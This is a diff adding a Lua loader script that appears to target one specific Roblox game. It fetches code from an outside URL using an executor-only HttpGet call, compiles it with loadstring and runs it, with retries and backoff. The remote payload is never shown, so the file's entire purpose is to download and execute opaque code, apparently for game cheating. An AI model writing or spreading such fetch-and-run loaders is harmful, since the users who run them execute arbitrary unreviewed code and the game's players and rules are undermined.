@@ -1,0 +1,61 @@
+local url = "https://api.jnkie.com/api/v1/luascripts/public/c8f98dcb81ed3a9db68c92f1c4c942934c157e9d46e18e5e8bd27ca4fe2aa3fc/download"
+local retries = 5
+local waitTime = 1.5
+local requiredGameId = 81440632616906
+
+if game.PlaceId ~= requiredGameId then
+    game:GetService("Players").LocalPlayer:Kick("unsupported game")
+    return
+end
+
+if _G.loaderRunning then
+    warn("already running")
+    return
+end
+_G.loaderRunning = true
+
+print("started loading from: " .. url)
+
+local success = false
+for i = 1, retries do
+    if success then break end
+    
+    print("attempt " .. i .. "/" .. retries)
+    
+    local downloaded, code = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if downloaded and code and #code > 10 then
+        print("got the code! size: " .. #code)
+        
+        local compiled, err = loadstring(code)
+        if compiled then
+            local ran, execErr = pcall(compiled)
+            if ran then
+                print("script executed successfully")
+                success = true
+                break
+            else
+                warn("exec error: " .. tostring(execErr))
+            end
+        else
+            warn("compile error: " .. tostring(err))
+        end
+    else
+        warn("download failed attempt " .. i)
+    end
+    
+    if i < retries then
+        local delay = waitTime * (2 ^ (i - 1))
+        print("waiting " .. delay .. " secs before retry...")
+        wait(delay)
+    end
+end
+
+if not success then
+    print("couldnt load the script after " .. retries .. " tries.")
+end
+
+_G.loaderRunning = nil
+print("Frameworks suite.")
